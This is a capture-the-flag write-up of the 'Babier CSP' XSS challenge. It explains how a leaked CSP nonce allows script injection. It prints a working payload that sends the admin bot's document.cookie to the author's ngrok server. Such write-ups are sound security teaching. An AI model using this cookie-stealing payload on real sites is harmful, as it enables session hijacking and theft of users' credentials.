Author: Gabrielle George
Date: Feb 6, 2021

Write-up for Babier CSP (XSS challenge)


This is a XSS challenge that involves 2 websites: an insecure one that has a XSS vulnerability (babier-csp.dicec.tf) and another website (Admin Bot)  that simply goes to any input URL. 
Here’s the vulnerable website.  All it does is give you a random fruit if you click “view fruit”. 

The vulnerable website allows you to execute any javascript as long as you include the NONCE in the tag, which is conveniently exposed if you view the page source:


The point of the challenge is to steal the cookie (“secret”) from the Admin Bot when it visits the vulnerable website.  To do this, I started an internet-accessible server using xampp and ngrok.  After googling a bunch, I found that you can save “Get” data  to a log file using this PHP code running on your server:


The payload forced the Admin Bot to go to my malicious server and put its document.cookie value as the get data, thereby logging it on my server:

The text is:
https://babier-csp.dicec.tf/?name=<script nonce=LRGWAXOY98Es0zz0QOVmag==>document.location="http://7b827dd62072.ngrok.io/cooks/untitled.php?cookie="%2Bdocument.cookie</script>

The payload is: 
<script nonce=LRGWAXOY98Es0zz0QOVmag==>
document.location='http://7b827dd62072.ngrok.io/cooks/untitled.php?cookie='+document.cookie;</script>
And there it is!


To get the flag, I looked at the index.js they included in the downloads, to find a reference to a URL that mentioned the variable SECRET.

This told me I had to put the secret in the url of the vulnerable site. And sure enough, flag captured! 

